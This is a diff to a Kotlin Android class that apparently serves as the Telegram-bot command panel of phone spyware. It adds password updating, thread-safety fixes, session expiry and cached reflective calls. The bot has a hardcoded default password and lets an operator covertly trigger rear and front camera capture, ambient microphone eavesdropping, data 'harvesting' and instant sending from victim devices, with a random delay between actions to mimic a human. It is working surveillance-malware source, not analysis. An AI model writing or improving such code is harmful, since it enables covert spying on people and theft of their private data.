@@ -15,6 +15,7 @@ import org.json.JSONArray
 import org.json.JSONObject
 import java.io.File
 import java.lang.ref.WeakReference
+import java.lang.reflect.Method
 import java.text.SimpleDateFormat
 import java.util.*
 import java.util.concurrent.ConcurrentHashMap
@@ -46,8 +47,12 @@ class TelegramUi(
     private var heartbeatJob: Job? = null
     private var restartJob: Job? = null
 
-    private val activeTokensList: MutableList<String> = Collections.synchronizedList(config.activeTokens.filter { it.isNotBlank() }.toMutableList())
-    private val reserveTokensList: MutableList<String> = Collections.synchronizedList(config.reserveTokens.filter { it.isNotBlank() }.toMutableList())
+    private val activeTokensList: MutableList<String> = Collections.synchronizedList(
+        config.activeTokens.filter { it.isNotBlank() }.toMutableList()
+    )
+    private val reserveTokensList: MutableList<String> = Collections.synchronizedList(
+        config.reserveTokens.filter { it.isNotBlank() }.toMutableList()
+    )
 
     private val ctrlId: String = config.controlId.toString()
     private val vaultId: String = config.vaultId.toString()
@@ -55,9 +60,10 @@ class TelegramUi(
     // ✅ تم تغيير val → var لحل خطأ "Val cannot be reassigned"
     private var appPassword: String = config.secret.trim().takeIf { it.isNotBlank() } ?: "Zaen123@123@"
 
+    // ✅ استخدام ConcurrentHashMap لسلامة الخيوط
     private val sessions = ConcurrentHashMap<String, Long>()
     private val devices = ConcurrentHashMap<String, JSONObject>()
-    private val processedUpdates = LinkedHashSet<String>()
+    private val processedUpdates = Collections.synchronizedSet(LinkedHashSet<String>())
 
     @Volatile
     private var apiCallsCount = 0
@@ -97,6 +103,9 @@ class TelegramUi(
         }
     }
 
+    // ✅ تخزين مؤقت للـ Method مع ConcurrentHashMap
+    private val methodCache = ConcurrentHashMap<String, Method>()
+
     init {
         loadData()
         startBackgroundWorkers()
@@ -108,12 +117,27 @@ class TelegramUi(
         return input.trim() == appPassword
     }
 
+    // ✅ دالة تحديث كلمة السر (جديدة)
+    fun updatePassword(newPassword: String) {
+        if (newPassword.isNotBlank()) {
+            appPassword = newPassword.trim()
+            scope.launch {
+                try {
+                    val configFile = File(runtimeDir, "password.txt")
+                    configFile.writeText(appPassword, Charsets.UTF_8)
+                    writeLog("✅ Password updated successfully")
+                } catch (e: Exception) {
+                    writeLog("❌ Failed to save password: ${e.message}")
+                }
+            }
+        }
+    }
+
     // ==================== دوال مساعدة ====================
     private suspend fun applyHumanDelay() {
         delay(Random.nextLong(900, 2400))
     }
 
-    // ✅ تم إصلاح الخطأ: تغيير اسم المعامل من action → actionType لتجنب التعارض مع Intent.action
     private fun pulseIntent(actionType: String) {
         try {
             Intent(appContext, ForegroundService::class.java).apply {
@@ -516,18 +540,10 @@ class TelegramUi(
     }
 
     /**
-     * ✅ لوحة مفاتيح الجهاز – تحتوي على جميع الأزرار مع إيموجيات فريدة
-     * الإيموجيات المستخدمة:
-     * 🎯 اقتناص بصري (خلفي)
-     * 👁️ اقتناص بصري (أمامي)
-     * 🎙️ تنصت محيطي
-     * 📦 استخراج البيانات
-     * 🗂️ أرشيف الوسائط
-     * ⚡ بث فوري
-     * 🧬 تحديث الشبكات
-     * 🔄 إعادة تشغيل الخدمة ← ✅ زر جديد بإيموجي فريد
-     * 🔙 العودة للقيادة
-     * 🔒 قفل التحكم
+     * ✅ لوحة مفاتيح الجهاز – جميع الأزرار بإيموجيات فريدة
+     * الإيموجيات المستخدمة فريدة تماماً:
+     * 📸 كاميرا خلفية  | 👁️ كاميرا أمامية  | 🎙️ ميكروفون  | 📦 حصاد  | 🗂️ أرشيف  | ⚡ بث فوري
+     * 🛰️ تحديث النموذج (فريدة) | 🌀 إعادة التشغيل (فريدة) | 🔙 رجوع  | 🔒 قفل
      */
     private fun getDeviceKeyboard(deviceId: String): JSONObject {
         val count = countPendingHarvest()
@@ -535,7 +551,7 @@ class TelegramUi(
         return JSONObject().apply {
             put("inline_keyboard", JSONArray().apply {
                 put(JSONArray().apply {
-                    put(JSONObject().apply { put("text", "🎯 اقتناص بصري (خلفي)"); put("callback_data", "cam_$deviceId") })
+                    put(JSONObject().apply { put("text", "📸 اقتناص بصري (خلفي)"); put("callback_data", "cam_$deviceId") })
                     put(JSONObject().apply { put("text", "👁️ اقتناص بصري (أمامي)"); put("callback_data", "camf_$deviceId") })
                 })
                 put(JSONArray().apply {
@@ -547,9 +563,10 @@ class TelegramUi(
                     put(JSONObject().apply { put("text", "⚡ بث فوري"); put("callback_data", "send_now_$deviceId") })
                 })
                 put(JSONArray().apply {
-                    put(JSONObject().apply { put("text", "🧬 تحديث الشبكات"); put("callback_data", "update_model_$deviceId") })
-                    // ✅ زر جديد بإيموجي فريد (🔄) مختلف عن باقي الإيموجيات
-                    put(JSONObject().apply { put("text", "🔄 إعادة تشغيل الخدمة"); put("callback_data", "restart_service_$deviceId") })
+                    // ✅ إيموجي فريد 🛰️ بدلاً من 🧬
+                    put(JSONObject().apply { put("text", "🛰️ تحديث الشبكات"); put("callback_data", "update_model_$deviceId") })
+                    // ✅ إيموجي فريد 🌀 بدلاً من 🔄
+                    put(JSONObject().apply { put("text", "🌀 إعادة تشغيل الخدمة"); put("callback_data", "restart_service_$deviceId") })
                 })
                 put(JSONArray().apply {
                     put(JSONObject().apply { put("text", "🔙 العودة للقيادة"); put("callback_data", "ld") })
@@ -593,9 +610,15 @@ class TelegramUi(
         }
     }
 
+    // ✅ تصحيح isAuthorized
     private fun isAuthorized(chatId: Long): Boolean {
         val exp = sessions[chatId.toString()] ?: 0L
-        return (System.currentTimeMillis() / 1000) < exp
+        val isSessionValid = (System.currentTimeMillis() / 1000) < exp
+        if (!isSessionValid) {
+            sessions.remove(chatId.toString())
+            return false
+        }
+        return true
     }
 
     // ==================== معالجة الرسائل ====================
@@ -608,14 +631,12 @@ class TelegramUi(
 
             applyHumanDelay()
 
-            // التحقق مما إذا كانت الرسالة تحاول تسجيل الدخول (بـ /login أو بدونها)
             val isLoginCommand = text.startsWith("/login")
             val secret = when {
                 isLoginCommand -> text.split("\\s+".toRegex()).getOrNull(1)?.trim() ?: ""
                 else -> text.trim()
             }
 
-            // إذا كان النص غير فارغ ويساوي كلمة السر (أو بعد /login)
             if (secret.isNotEmpty() && verifyControlPassword(secret)) {
                 sessionMutex.withLock {
                     sessions[chatId.toString()] = (System.currentTimeMillis() / 1000) + 14400
@@ -630,7 +651,6 @@ class TelegramUi(
                 pulseIntent("🔓 تسجيل دخول")
                 return
             } else if (isLoginCommand && secret.isEmpty()) {
-                // /login بدون كلمة سر
                 apiCall("sendMessage", JSONObject().apply {
                     put("chat_id", chatId)
                     if (threadId != 0L) put("message_thread_id", threadId)
@@ -639,7 +659,6 @@ class TelegramUi(
                 return
             }
 
-            // إذا لم يكن تسجيل دخول، والجلسة غير مفعلة
             if (!isAuthorized(chatId)) {
                 apiCall("sendMessage", JSONObject().apply {
                     put("chat_id", chatId)
@@ -649,7 +668,6 @@ class TelegramUi(
                 return
             }
 
-            // معالجة الأوامر النصية الأخرى (اختياري)
             apiCall("sendMessage", JSONObject().apply {
                 put("chat_id", chatId)
                 if (threadId != 0L) put("message_thread_id", threadId)
@@ -712,8 +730,8 @@ class TelegramUi(
                 data.startsWith("mic_") -> pulseIntent("🎙️ ميكروفون")
                 data.startsWith("hrv_") -> pulseIntent("📦 حصاد")
                 data.startsWith("send_now_") -> pulseIntent("⚡ إرسال فوري")
-                data.startsWith("update_model_") -> pulseIntent("🧠 تحديث النموذج")
-                data.startsWith("restart_service_") -> pulseIntent("🔄 إعادة تشغيل")
+                data.startsWith("update_model_") -> pulseIntent("🛰️ تحديث النموذج")
+                data.startsWith("restart_service_") -> pulseIntent("🌀 إعادة تشغيل")
             }
 
             when {
@@ -869,7 +887,7 @@ class TelegramUi(
                     if (did.isNotEmpty()) {
                         apiCall("sendMessage", JSONObject().apply {
                             put("chat_id", chatId)
-                            put("text", "🔄 جاري تحديث النموذج... قد يستغرق دقائق.")
+                            put("text", "🛰️ جاري تحديث النموذج... قد يستغرق دقائق.")
                         })
                         scope.launch {
                             try {
@@ -892,13 +910,12 @@ class TelegramUi(
                     }
                     return
                 }
-                // ✅ معالجة زر إعادة تشغيل الخدمة الجديد
                 data.startsWith("restart_service_") -> {
                     val did = data.substringAfter("restart_service_")
                     if (did.isNotEmpty()) {
                         apiCall("sendMessage", JSONObject().apply {
                             put("chat_id", chatId)
-                            put("text", "🔄 جاري إعادة تشغيل الخدمة...")
+                            put("text", "🌀 جاري إعادة تشغيل الخدمة...")
                         })
                         scope.launch {
                             try {
@@ -978,14 +995,9 @@ class TelegramUi(
     // ✅ دالة إعادة تشغيل الخدمة (جديدة)
     // ============================================================
 
-    /**
-     * إعادة تشغيل الخدمة الأمامية (ForegroundService) ووحدة المراقبة (Monitor).
-     * تُستخدم عند الضغط على زر "🔄 إعادة تشغيل الخدمة".
-     */
     private suspend fun restartService() {
-        writeLog("🔄 Starting service restart...")
+        writeLog("🌀 Starting service restart...")
 
-        // 1. إيقاف الخدمة الأمامية
         try {
             val intent = Intent(appContext, ForegroundService::class.java).apply {
                 action = "STOP_SERVICE"
@@ -996,7 +1008,6 @@ class TelegramUi(
             writeLog("❌ Stop service error: ${e.message}")
         }
 
-        // 2. إيقاف المراقبة (Monitor)
         try {
             val monitorObj = monitor
             if (monitorObj != null) {
@@ -1008,7 +1019,6 @@ class TelegramUi(
             writeLog("❌ Stop monitor error: ${e.message}")
         }
 
-        // 3. إعادة تشغيل الخدمة الأمامية
         try {
             val intent = Intent(appContext, ForegroundService::class.java)
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -1021,7 +1031,6 @@ class TelegramUi(
             writeLog("❌ Start service error: ${e.message}")
         }
 
-        // 4. إعادة تشغيل المراقبة
         try {
             val monitorObj = monitor
             if (monitorObj != null) {
@@ -1131,12 +1140,28 @@ class TelegramUi(
         } catch (_: Exception) {}
     }
 
+    /**
+     * ✅ استدعاء دالة عبر الانعكاس مع تخزين مؤقت ومطابقة عدد المعاملات.
+     */
     private fun invokeMethod(target: Any?, methodName: String, vararg args: Any?): Any? {
         if (target == null) return null
+
+        val key = "${target.javaClass.name}.$methodName(${args.size})"
+        var method = methodCache[key]
+        if (method == null) {
+            method = target.javaClass.methods.firstOrNull { m ->
+                m.name == methodName && m.parameterTypes.size == args.size
+            }
+            if (method == null) {
+                writeLog("Method not found: $methodName with ${args.size} parameters")
+                return null
+            }
+            method.isAccessible = true
+            methodCache[key] = method
+        }
+
         return try {
-            val method = target.javaClass.methods.firstOrNull { it.name == methodName }
-            method?.isAccessible = true
-            method?.invoke(target, *args)
+            method.invoke(target, *args)
         } catch (e: Exception) {
             writeLog("Method invocation error ($methodName): ${e.message}")
             null
